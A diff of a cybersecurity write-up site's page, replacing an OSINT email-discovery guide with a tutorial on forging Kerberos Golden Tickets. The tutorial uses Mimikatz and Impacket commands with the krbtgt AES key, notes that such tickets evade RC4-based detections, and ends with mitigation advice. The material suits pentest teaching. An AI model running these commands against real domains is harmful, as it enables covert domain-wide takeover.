@@ -12,32 +12,36 @@
         <meta name="author" content="Bilash J. Shahi">
       
       
-        <link rel="canonical" href="https://elodvk.github.io/osint/email-discovery/">
+        <link rel="canonical" href="https://elodvk.github.io/active_directory/Post%20Domain%20Compromise/golden-ticket/">
       
       
+        <link rel="prev" href="../dump-ntds.dit/">
+      
+      
+        <link rel="next" href="../../../blog/posts/2025-10-22-pnpt-review/">
       
       
         
       
       
-      <link rel="icon" href="../../assets/images/favicon.png">
+      <link rel="icon" href="../../../assets/images/favicon.png">
       <meta name="generator" content="zensical-0.0.14">
     
     
       
-        <title>Discovering Email Addresses - Cybersecurity Writeups</title>
+        <title>Golden Ticket - Cybersecurity Writeups</title>
       
     
     
       
         
       
-      <link rel="stylesheet" href="../../assets/stylesheets/modern/main.f1b6466b.min.css">
+      <link rel="stylesheet" href="../../../assets/stylesheets/modern/main.f1b6466b.min.css">
       
         
           
         
-        <link rel="stylesheet" href="../../assets/stylesheets/modern/palette.dfe2e883.min.css">
+        <link rel="stylesheet" href="../../../assets/stylesheets/modern/palette.dfe2e883.min.css">
       
       
   
@@ -85,9 +89,9 @@
       
     
     
-      <link rel="stylesheet" href="../../stylesheets/extra.css">
+      <link rel="stylesheet" href="../../../stylesheets/extra.css">
     
-    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,t)=>(e<<5)-e+t.charCodeAt(0)),0),__md_get=(e,t=localStorage,a=__md_scope)=>JSON.parse(t.getItem(a.pathname+"."+e)),__md_set=(e,t,a=localStorage,_=__md_scope)=>{try{a.setItem(_.pathname+"."+e,JSON.stringify(t))}catch(e){}},document.documentElement.setAttribute("data-platform",navigator.platform)</script>
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,t)=>(e<<5)-e+t.charCodeAt(0)),0),__md_get=(e,t=localStorage,a=__md_scope)=>JSON.parse(t.getItem(a.pathname+"."+e)),__md_set=(e,t,a=localStorage,_=__md_scope)=>{try{a.setItem(_.pathname+"."+e,JSON.stringify(t))}catch(e){}},document.documentElement.setAttribute("data-platform",navigator.platform)</script>
     
       
 
@@ -112,7 +116,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#1-automated-osint-tools" class="md-skip">
+        <a href="#the-why-upgrading-from-ntlm-to-aes-keys" class="md-skip">
           Skip to content
         </a>
       
@@ -126,7 +130,7 @@
 
 <header class="md-header" data-md-component="header">
   <nav class="md-header__inner md-grid" aria-label="Header">
-    <a href="../.." title="Cybersecurity Writeups" class="md-header__button md-logo" aria-label="Cybersecurity Writeups" data-md-component="logo">
+    <a href="../../.." title="Cybersecurity Writeups" class="md-header__button md-logo" aria-label="Cybersecurity Writeups" data-md-component="logo">
       
   
   <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-book-open" viewBox="0 0 24 24"><path d="M12 7v14M3 18a1 1 0 0 1-1-1V4a1 1 0 0 1 1-1h5a4 4 0 0 1 4 4 4 4 0 0 1 4-4h5a1 1 0 0 1 1 1v13a1 1 0 0 1-1 1h-6a3 3 0 0 0-3 3 3 3 0 0 0-3-3z"/></svg>
@@ -146,7 +150,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Discovering Email Addresses
+              Golden Ticket
             
           </span>
         </div>
@@ -228,11 +232,13 @@
   
   
   
+    
+  
   
     
     
-      <li class="md-tabs__item">
-        <a href="../../active_directory/" class="md-tabs__link">
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../../" class="md-tabs__link">
           
   
   Active Directory
@@ -251,7 +257,7 @@
     
     
       <li class="md-tabs__item">
-        <a href="../../blog/posts/2025-10-22-pnpt-review/" class="md-tabs__link">
+        <a href="../../../blog/posts/2025-10-22-pnpt-review/" class="md-tabs__link">
           
   
   Blog
@@ -284,7 +290,7 @@
 
 <nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
   <label class="md-nav__title" for="__drawer">
-    <a href="../.." title="Cybersecurity Writeups" class="md-nav__button md-logo" aria-label="Cybersecurity Writeups" data-md-component="logo">
+    <a href="../../.." title="Cybersecurity Writeups" class="md-nav__button md-logo" aria-label="Cybersecurity Writeups" data-md-component="logo">
       
   
   <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-book-open" viewBox="0 0 24 24"><path d="M12 7v14M3 18a1 1 0 0 1-1-1V4a1 1 0 0 1 1-1h5a4 4 0 0 1 4 4 4 4 0 0 1 4-4h5a1 1 0 0 1 1 1v13a1 1 0 0 1-1 1h-6a3 3 0 0 0-3 3 3 3 0 0 0-3-3z"/></svg>
@@ -311,6 +317,8 @@
       
   
   
+    
+  
   
   
     
@@ -332,22 +340,23 @@
     
     
       
+        
+        
+      
       
         
       
     
     
-    <li class="md-nav__item md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
       
         
         
-          
-        
-        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_1" >
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_1" checked>
         
           
           <div class="md-nav__link md-nav__container">
-            <a href="../../active_directory/" class="md-nav__link ">
+            <a href="../../" class="md-nav__link ">
               
   
   
@@ -365,13 +374,13 @@
             </a>
             
               
-              <label class="md-nav__link " for="__nav_1" id="__nav_1_label" tabindex="0">
+              <label class="md-nav__link " for="__nav_1" id="__nav_1_label" tabindex="">
                 <span class="md-nav__icon md-icon"></span>
               </label>
             
           </div>
         
-        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_1_label" aria-expanded="false">
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_1_label" aria-expanded="true">
           <label class="md-nav__title" for="__nav_1">
             <span class="md-nav__icon md-icon"></span>
             
@@ -405,10 +414,13 @@
       
       
         
+          
+          
+        
       
     
     
-    <li class="md-nav__item md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
       
         
         
@@ -417,7 +429,7 @@
         <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_1_2" >
         
           
-          <label class="md-nav__link" for="__nav_1_2" id="__nav_1_2_label" tabindex="0">
+          <label class="md-nav__link" for="__nav_1_2" id="__nav_1_2_label" tabindex="">
             
   
   
@@ -453,7 +465,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../active_directory/Initial%20Attack%20Vectors/llmnr-poisioning/" class="md-nav__link">
+      <a href="../../Initial%20Attack%20Vectors/llmnr-poisioning/" class="md-nav__link">
         
   
   
@@ -481,7 +493,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../active_directory/Initial%20Attack%20Vectors/smb-relay/" class="md-nav__link">
+      <a href="../../Initial%20Attack%20Vectors/smb-relay/" class="md-nav__link">
         
   
   
@@ -509,7 +521,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../active_directory/Initial%20Attack%20Vectors/mitm6/" class="md-nav__link">
+      <a href="../../Initial%20Attack%20Vectors/mitm6/" class="md-nav__link">
         
   
   
@@ -559,10 +571,13 @@
       
       
         
+          
+          
+        
       
     
     
-    <li class="md-nav__item md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
       
         
         
@@ -571,7 +586,7 @@
         <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_1_3" >
         
           
-          <label class="md-nav__link" for="__nav_1_3" id="__nav_1_3_label" tabindex="0">
+          <label class="md-nav__link" for="__nav_1_3" id="__nav_1_3_label" tabindex="">
             
   
   
@@ -607,7 +622,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../active_directory/Post-Compromise%20Enumeration/bloodhound/" class="md-nav__link">
+      <a href="../../Post-Compromise%20Enumeration/bloodhound/" class="md-nav__link">
         
   
   
@@ -635,7 +650,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../active_directory/Post-Compromise%20Enumeration/ldapdomaindump/" class="md-nav__link">
+      <a href="../../Post-Compromise%20Enumeration/ldapdomaindump/" class="md-nav__link">
         
   
   
@@ -663,7 +678,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../active_directory/Post-Compromise%20Enumeration/pingcastle/" class="md-nav__link">
+      <a href="../../Post-Compromise%20Enumeration/pingcastle/" class="md-nav__link">
         
   
   
@@ -719,10 +734,13 @@
       
       
         
+          
+          
+        
       
     
     
-    <li class="md-nav__item md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
       
         
         
@@ -731,7 +749,7 @@
         <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_1_4" >
         
           
-          <label class="md-nav__link" for="__nav_1_4" id="__nav_1_4_label" tabindex="0">
+          <label class="md-nav__link" for="__nav_1_4" id="__nav_1_4_label" tabindex="">
             
   
   
@@ -767,7 +785,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../active_directory/Post%20Compromise%20Attacks/dumping%20&%20cracking%20hashes/" class="md-nav__link">
+      <a href="../../Post%20Compromise%20Attacks/dumping%20&%20cracking%20hashes/" class="md-nav__link">
         
   
   
@@ -795,7 +813,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../active_directory/Post%20Compromise%20Attacks/gpp/" class="md-nav__link">
+      <a href="../../Post%20Compromise%20Attacks/gpp/" class="md-nav__link">
         
   
   
@@ -823,7 +841,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../active_directory/Post%20Compromise%20Attacks/kerberoasting/" class="md-nav__link">
+      <a href="../../Post%20Compromise%20Attacks/kerberoasting/" class="md-nav__link">
         
   
   
@@ -851,7 +869,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../active_directory/Post%20Compromise%20Attacks/lnk-file-attacks/" class="md-nav__link">
+      <a href="../../Post%20Compromise%20Attacks/lnk-file-attacks/" class="md-nav__link">
         
   
   
@@ -879,7 +897,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../active_directory/Post%20Compromise%20Attacks/mimikatz-cred-dumping/" class="md-nav__link">
+      <a href="../../Post%20Compromise%20Attacks/mimikatz-cred-dumping/" class="md-nav__link">
         
   
   
@@ -907,7 +925,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../active_directory/Post%20Compromise%20Attacks/token-impersonation/" class="md-nav__link">
+      <a href="../../Post%20Compromise%20Attacks/token-impersonation/" class="md-nav__link">
         
   
   
@@ -940,8 +958,10 @@
                 
   
   
+    
   
   
+  
     
     
       
@@ -954,20 +974,21 @@
     
       
       
-        
-      
-    
-    
-    <li class="md-nav__item md-nav__item--nested">
-      
-        
         
           
+          
         
-        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_1_5" >
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_1_5" checked>
         
           
-          <label class="md-nav__link" for="__nav_1_5" id="__nav_1_5_label" tabindex="0">
+          <label class="md-nav__link" for="__nav_1_5" id="__nav_1_5_label" tabindex="">
             
   
   
@@ -985,7 +1006,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_1_5_label" aria-expanded="false">
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_1_5_label" aria-expanded="true">
           <label class="md-nav__title" for="__nav_1_5">
             <span class="md-nav__icon md-icon"></span>
             
@@ -1003,7 +1024,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../active_directory/Post%20Domain%20Compromise/dump-ntds.dit/" class="md-nav__link">
+      <a href="../dump-ntds.dit/" class="md-nav__link">
         
   
   
@@ -1028,10 +1049,35 @@
                 
   
   
+    
   
   
-    <li class="md-nav__item">
-      <a href="../../active_directory/Post%20Domain%20Compromise/golden-ticket/" class="md-nav__link">
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Golden Ticket
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
         
   
   
@@ -1047,6 +1093,86 @@
   
 
       </a>
+      
+        
+
+
+<nav class="md-nav md-nav--secondary" aria-label="On this page">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      On this page
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#the-why-upgrading-from-ntlm-to-aes-keys" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        The "Why": Upgrading from NTLM to AES Keys
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#the-heist-forging-with-modern-cryptography" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        The Heist: Forging with Modern Cryptography
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="The Heist: Forging with Modern Cryptography">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#using-mimikatz" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Using Mimikatz
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#using-impacket-ticketerpy" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Using Impacket (ticketer.py)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#how-it-fits-into-your-strategy-modern-persistence" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        How It Fits into Your Strategy: Modern Persistence
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
     </li>
   
 
@@ -1132,7 +1258,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../blog/posts/2025-10-22-pnpt-review/" class="md-nav__link">
+      <a href="../../../blog/posts/2025-10-22-pnpt-review/" class="md-nav__link">
         
   
   
@@ -1186,22 +1312,44 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#1-automated-osint-tools" class="md-nav__link">
+  <a href="#the-why-upgrading-from-ntlm-to-aes-keys" class="md-nav__link">
     <span class="md-ellipsis">
       
-        1. Automated OSINT Tools 🤖
+        The "Why": Upgrading from NTLM to AES Keys
       
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="1. Automated OSINT Tools 🤖">
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#the-heist-forging-with-modern-cryptography" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        The Heist: Forging with Modern Cryptography
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="The Heist: Forging with Modern Cryptography">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#theharvester" class="md-nav__link">
+  <a href="#using-mimikatz" class="md-nav__link">
     <span class="md-ellipsis">
       
-        theHarvester
+        Using Mimikatz
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#using-impacket-ticketerpy" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Using Impacket (ticketer.py)
       
     </span>
   </a>
@@ -1214,71 +1362,10 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#2-specialised-websites-and-services" class="md-nav__link">
+  <a href="#how-it-fits-into-your-strategy-modern-persistence" class="md-nav__link">
     <span class="md-ellipsis">
       
-        2. Specialised Websites and Services 🌐
-      
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="2. Specialised Websites and Services 🌐">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#hunterio" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Hunter.io
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#other-notable-services" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Other Notable Services
-      
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#3-manual-search-engine-techniques-google-dorking" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        3. Manual Search Engine Techniques (Google Dorking) 🕵️
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#4-social-media-and-professional-networks" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        4. Social Media and Professional Networks 🧑‍💼
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#5-breach-databases" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        5. Breach Databases 💥
+        How It Fits into Your Strategy: Modern Persistence
       
     </span>
   </a>
@@ -1303,6 +1390,64 @@
   
 
 
+  <nav class="md-path" aria-label="Navigation" >
+    <ol class="md-path__list">
+      
+        
+  
+  
+    <li class="md-path__item">
+      <a href="../../.." class="md-path__link">
+        
+  <span class="md-ellipsis">
+    Home
+  </span>
+
+      </a>
+    </li>
+  
+
+      
+      
+        
+  
+  
+    
+    
+      <li class="md-path__item">
+        <a href="../../" class="md-path__link">
+          
+  <span class="md-ellipsis">
+    Active Directory
+  </span>
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+    
+    
+      <li class="md-path__item">
+        <a href="../dump-ntds.dit/" class="md-path__link">
+          
+  <span class="md-ellipsis">
+    Post Domain Compromise
+  </span>
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ol>
+  </nav>
+
               
               <article class="md-content__inner md-typeset">
                 
@@ -1311,77 +1456,70 @@
   
 
 
-  <h1>Discovering Email Addresses</h1>
+  <h1>Golden Ticket</h1>
 
-<p>Finding valid email addresses is a cornerstone of passive reconnaissance. It's the primary method for targeting individuals in phishing campaigns and can reveal usernames and company-wide email patterns. This guide covers the essential tools, websites, and techniques to uncover email addresses.</p>
+<p>You've dumped the <code>krbtgt</code> account credentials from a Domain Controller. You have its NTLM hash, but in a modern, secure Active Directory environment, that's only half the story. The true power lies in the stronger cryptographic keys derived from that password: the <strong>AES keys</strong>.</p>
+<p>A <strong>Golden Ticket</strong> attack is the creation of a forged Kerberos Ticket-Granting Ticket (TGT). By forging it with the <code>krbtgt</code> account's secret keys, you can grant yourself administrative access to any resource, as any user, for as long as you desire. While the NTLM hash works for older encryption, using the AES key is the modern, preferred method that ensures your ticket is accepted in a hardened environment.</p>
+<p>Think of it like this: The NTLM hash is the master key to the kingdom's old iron locks. The AES key is the master key for the new, high-security digital locks. To guarantee entry everywhere, you need the key for the modern locks.</p>
 <hr />
-<h2 id="1-automated-osint-tools">1. Automated OSINT Tools 🤖<a class="headerlink" href="#1-automated-osint-tools" title="Permanent link">&para;</a></h2>
-<p>Automated tools are the most efficient way to gather emails. They query multiple public sources at once and aggregate the results.</p>
-<h3 id="theharvester">theHarvester<a class="headerlink" href="#theharvester" title="Permanent link">&para;</a></h3>
-<p>A staple in any pentester's toolkit, <code>theHarvester</code> is a command-line tool included in Kali Linux. It gathers emails, subdomains, employee names, and open ports from public sources like search engines and PGP key servers.</p>
+<h2 id="the-why-upgrading-from-ntlm-to-aes-keys">The "Why": Upgrading from NTLM to AES Keys<a class="headerlink" href="#the-why-upgrading-from-ntlm-to-aes-keys" title="Permanent link">&para;</a></h2>
+<p>The <code>krbtgt</code> account's password hash is used to sign all Kerberos tickets. In older domains, this was done using the RC4-HMAC algorithm, which is based on the NTLM hash.</p>
+<p>However, starting with Windows Server 2008, Active Directory introduced support for stronger <strong>AES-256 and AES-128 encryption</strong> for Kerberos. In any reasonably modern domain, the Domain Controllers will use and prefer tickets signed with these AES keys.</p>
+<p>If you create a Golden Ticket signed only with the NTLM hash (RC4) and try to use it in an environment that expects AES, your request will likely be rejected. Therefore, a modern attacker <strong>must use the <code>krbtgt</code> AES key</strong> to create a fully-functional Golden Ticket.</p>
+<hr />
+<h2 id="the-heist-forging-with-modern-cryptography">The Heist: Forging with Modern Cryptography<a class="headerlink" href="#the-heist-forging-with-modern-cryptography" title="Permanent link">&para;</a></h2>
+<p>The prerequisites are the same, but your most important ingredient is now the <strong><code>krbtgt</code> AES256 key</strong>, which you get when you dump the account's secrets.</p>
+<ol>
+<li><strong>The Domain Name:</strong> e.g., <code>corp.local</code></li>
+<li><strong>The Domain SID:</strong> The Security Identifier of the domain.</li>
+<li><strong>The Target User:</strong> The user you want to impersonate (usually <code>Administrator</code>).</li>
+<li><strong>The <code>krbtgt</code> AES256 Key:</strong> The modern secret sauce.</li>
+</ol>
+<p>Tools like <code>impacket-secretsdump</code> or <code>Mimikatz</code> will dump these keys for you right alongside the NTLM hash.</p>
+<h3 id="using-mimikatz"><strong>Using Mimikatz</strong><a class="headerlink" href="#using-mimikatz" title="Permanent link">&para;</a></h3>
+<p>The command is nearly identical to before, but instead of <code>/krbtgt</code> (for the NTLM hash), you use <code>/aes256</code>.</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="n">mimikatz</span> <span class="c"># kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-12345-67890-1234 /aes256:c899b82192534578160b3341434237a8549d532342342342342342342234 /ptt</span>
+</span></code></pre></div>
 <ul>
-<li><strong>How it Works</strong>: You provide a domain, and it queries sources like Google, Bing, Hunter.io, and more to find any associated email addresses.</li>
-<li><strong>Example Usage</strong>:
-    <div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>theharvester<span class="w"> </span>-d<span class="w"> </span>example.com<span class="w"> </span>-b<span class="w"> </span>all
-</span></code></pre></div><ul>
-<li><code>-d</code>: Specifies the target domain.</li>
-<li><code>-b</code>: Specifies the data source (e.g., <code>google</code>, <code>bing</code>, <code>hunter</code>, or <code>all</code>).</li>
+<li><strong>/aes256:</strong> You provide the AES256 key for the <code>krbtgt</code> account. This is now the preferred flag over <code>/krbtgt</code>.</li>
+<li><strong>/ptt:</strong> "Pass the Ticket" immediately injects the newly forged, AES-strong ticket into your current session.</li>
 </ul>
+<p>Your command prompt now operates with the full authority of a Domain Admin, and your Kerberos tickets will be cryptographically modern and accepted everywhere in the domain.</p>
+<h3 id="using-impacket-ticketerpy"><strong>Using Impacket (<code>ticketer.py</code>)</strong><a class="headerlink" href="#using-impacket-ticketerpy" title="Permanent link">&para;</a></h3>
+<p>Similarly, with Impacket, you simply swap the hash flag for the key flag.</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="c1"># 1. Create the ticket file using the AES key</span>
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>ticketer.py<span class="w"> </span>-aesKey<span class="w"> </span>c899b82192534578160b3341434237a8549d532342342342342342342234<span class="w"> </span>-domain-sid<span class="w"> </span>&lt;SID&gt;<span class="w"> </span>-domain<span class="w"> </span>&lt;domain&gt;<span class="w"> </span>Administrator
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="c1"># 2. Set the KRB5CCNAME environment variable to point to the ticket</span>
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>Administrator.ccache
+</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>
+</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a><span class="c1"># 3. Use other tools like psexec.py, which will automatically use the ticket</span>
+</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a>psexec.py<span class="w"> </span>-k<span class="w"> </span>-no-pass<span class="w"> </span>-dc-ip<span class="w"> </span>&lt;DC_IP&gt;<span class="w"> </span>&lt;domain&gt;/Administrator
+</span></code></pre></div>
+<h2 id="how-it-fits-into-your-strategy-modern-persistence">How It Fits into Your Strategy: Modern Persistence<a class="headerlink" href="#how-it-fits-into-your-strategy-modern-persistence" title="Permanent link">&para;</a></h2>
+<p>Using the AES key doesn't change the strategy; it perfects it.</p>
+<ul>
+<li>
+<p><strong>It's The Standard</strong>: In any pentest against a post-2008 domain, using the AES key should be your default method for forging Golden Tickets.</p>
+</li>
+<li>
+<p><strong>Bypasses Some Detections</strong>: Security tools monitoring for weak RC4 Kerberos tickets (a common sign of an older-style Golden Ticket attack) will be bypassed when you use a ticket signed with AES.</p>
+</li>
+<li>
+<p><strong>Guaranteed Access</strong>: It ensures your ticket will be accepted by modern, patched Domain Controllers and services.</p>
 </li>
 </ul>
 <hr />
-<h2 id="2-specialised-websites-and-services">2. Specialised Websites and Services 🌐<a class="headerlink" href="#2-specialised-websites-and-services" title="Permanent link">&para;</a></h2>
-<p>Several web-based platforms are built specifically for finding professional email addresses. They often have free tiers that are perfect for targeted reconnaissance.</p>
-<h3 id="hunterio">Hunter.io<a class="headerlink" href="#hunterio" title="Permanent link">&para;</a></h3>
-<p>Hunter is one of the most popular and powerful services for finding email addresses. It crawls the web and indexes publicly available professional email addresses.</p>
-<ul>
-<li><strong>Objective</strong>: To find email addresses associated with a specific company or professional.</li>
-<li><strong>Resources</strong>:<ul>
-<li><strong>Domain Search</strong>: You enter a company domain (e.g., <code>example.com</code>), and it returns known email addresses and the most common email pattern (e.g., <code>{first}.{last}@example.com</code>).</li>
-<li><strong>Email Finder</strong>: If you know a person's full name and the company they work for, Hunter can find their specific email address.</li>
-<li><strong>Browser Extension</strong>: A Chrome extension allows you to find emails for the website you're currently visiting.</li>
-</ul>
+<p>## Mitigation: The Defense is the Same</p>
+<p>The good news for defenders is that the mitigation strategy doesn't change. Because the AES keys are derived directly from the <code>krbtgt</code> account's password, the same defense applies:</p>
+<ol>
+<li>
+<p><strong>Reset the <code>krbtgt</code> Account Password TWICE</strong>. Resetting the password changes the underlying secret from which both the NTLM hash and the AES keys are generated. Doing it twice ensures that all old keys and tickets are invalidated throughout the domain's replication cycle.</p>
 </li>
-</ul>
-<h3 id="other-notable-services">Other Notable Services<a class="headerlink" href="#other-notable-services" title="Permanent link">&para;</a></h3>
-<ul>
-<li><strong>PhoneBook.cz</strong>: Allows you to see all emails, subdomains, and URLs associated with a domain. It's a simple but powerful web-based tool.</li>
-<li><strong>VoilaNorbert</strong>: Another popular service that finds corporate emails. You provide a name and a company domain.</li>
-</ul>
-<hr />
-<h2 id="3-manual-search-engine-techniques-google-dorking">3. Manual Search Engine Techniques (Google Dorking) 🕵️<a class="headerlink" href="#3-manual-search-engine-techniques-google-dorking" title="Permanent link">&para;</a></h2>
-<p>Using advanced search operators, you can force search engines like Google to uncover email addresses that have been indexed in public documents and web pages.</p>
-<ul>
-<li><strong>Objective</strong>: To find emails within specific file types or on particular websites.</li>
-<li><strong>Common Dorks for Email Discovery</strong>:<ul>
-<li>Find emails on a specific website:
-    <div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>site:example.com &quot;email&quot;
-</span></code></pre></div></li>
-<li>Search for specific file types that often contain email lists (like spreadsheets):
-    <div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>site:example.com filetype:xls intext:&quot;email&quot;
-</span></code></pre></div></li>
-<li>Combine terms to find employee lists:
-    <div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>filetype:pdf intext:&quot;@example.com&quot; &quot;contact&quot;
-</span></code></pre></div></li>
-<li>Find emails on social or code-sharing platforms:
-    <div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>site:github.com &quot;@example.com&quot;
-</span></code></pre></div></li>
-</ul>
+<li>
+<p><strong>Protect Your Domain Controllers</strong>. The best defense is to prevent an attacker from being able to dump the krbtgt secrets in the first place.</p>
 </li>
-</ul>
-<hr />
-<h2 id="4-social-media-and-professional-networks">4. Social Media and Professional Networks 🧑‍💼<a class="headerlink" href="#4-social-media-and-professional-networks" title="Permanent link">&para;</a></h2>
-<p>People often list their contact information publicly on professional networking sites.</p>
-<ul>
-<li><strong>LinkedIn</strong>: The most valuable resource. While direct emails are often hidden, people may list them in their "Contact Info" section or even in their profile summary or posts. It's also the best place to find names and job titles to use with a tool like Hunter.io.</li>
-<li><strong>GitHub</strong>: Developers frequently commit code with their email address in the commit logs. If a company has a public GitHub organization, you can inspect the commit history of its employees to find their emails.</li>
-</ul>
-<hr />
-<h2 id="5-breach-databases">5. Breach Databases 💥<a class="headerlink" href="#5-breach-databases" title="Permanent link">&para;</a></h2>
-<p>While ethically grey and legally complex, checking public data breach dumps can reveal corporate email addresses and password patterns. This is an advanced technique and should be approached with caution.</p>
-<ul>
